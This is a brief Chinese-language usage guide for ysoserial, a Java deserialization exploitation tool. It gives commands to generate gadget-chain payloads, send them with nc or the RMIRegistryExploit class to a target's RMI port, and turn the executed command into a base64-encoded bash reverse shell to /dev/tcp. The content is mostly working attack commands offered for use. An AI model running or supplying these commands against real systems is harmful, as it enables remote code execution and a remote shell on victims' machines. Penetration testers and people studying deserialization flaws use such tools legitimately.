## 简介

针对Java的反序列化漏洞利用工具，利用已知的gadgets（利用链），再根据想要在靶机上执行的命令，从而构造出一个特制的payload。

下载地址https://github.com/frohoff/ysoserial.git

## 用法

```bash
java -jar ysoserial.ja //查看可用的gadgets
```

```bash
$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin   //生成payload写入.bin中
$ nc 10.10.10.10 1099 < groovypayload.bin  //向远程主机的RMI服务的端口传输.bin文件中的内容

```

```bash
$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe   //直接向远程主机的RMI服务的端口传输payload，myhost为靶机ip或域名

```

其中要执行的命令最好是原先的反弹shell命令的base64编码形式，例如

```bash
bash -i >& /dev/tcp/ip/port 0>&1  //改为
bash -c {echo,对上行命令base64编码的结果}|{base64,-d}|{bash.-i} //执行的第一个{}命令的输出作为第二个{}中命令的输入，然后再将第二个{}命令结果的输出作为第三个{}命令的输入，最后输出到tty
```

